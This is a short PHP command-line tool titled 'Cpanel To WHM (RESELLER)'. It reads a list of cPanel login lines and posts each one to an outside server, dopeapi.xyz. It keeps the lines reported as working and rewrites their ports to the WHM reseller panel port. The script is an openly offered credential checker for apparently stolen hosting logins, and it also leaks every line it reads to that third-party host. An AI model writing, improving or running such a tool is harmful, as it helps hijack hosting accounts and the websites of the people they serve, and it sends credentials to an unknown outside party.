<?php error_reporting(0);echo "\n\033[92mCpanel To WHM (RESELLER)\033[0m\nAuthor: \033[91mOrion Hridoy\033[0m\n\n";$pok=readline('Enter CP Filename: ');$pok2=readline('Enter Save Filename: ');echo "\n";if ($file = fopen($pok, "r")) { while(!feof($file)) { $line = fgets($file);$paramsPost = array("orion"=>$line,);$req = curl_init("http://dopeapi.xyz/0n0x-w5m/api.php");curl_setopt($req, CURLOPT_RETURNTRANSFER, true);curl_setopt($req, CURLOPT_POSTFIELDS, $paramsPost);$result = curl_exec($req);if (strpos($result, 'Working-Fine') !== false) { echo $line." > \033[32mWHM Found\033[0m\n";$txt = str_replace(array("\r", "\n"), '', $line);$myfile = file_put_contents(dirname(__FILE__).'/'.$pok2, str_replace([":2082",":2083"], ":2087", $txt).PHP_EOL , FILE_APPEND | LOCK_EX);} else { echo $line." > \033[31mWHM Not Found\033[0m\n";} curl_close($req);} fclose($file);echo "\nResult Saved On \033[36m".$pok2."\033[0m\nTotal WHM Found: \033[95m".count(file($pok2))."\033[0m\n";} else { echo "\033[36mInsert Your Filename Like\033[0m \033[95mCpanel.txt\033[0m\n";} ?>
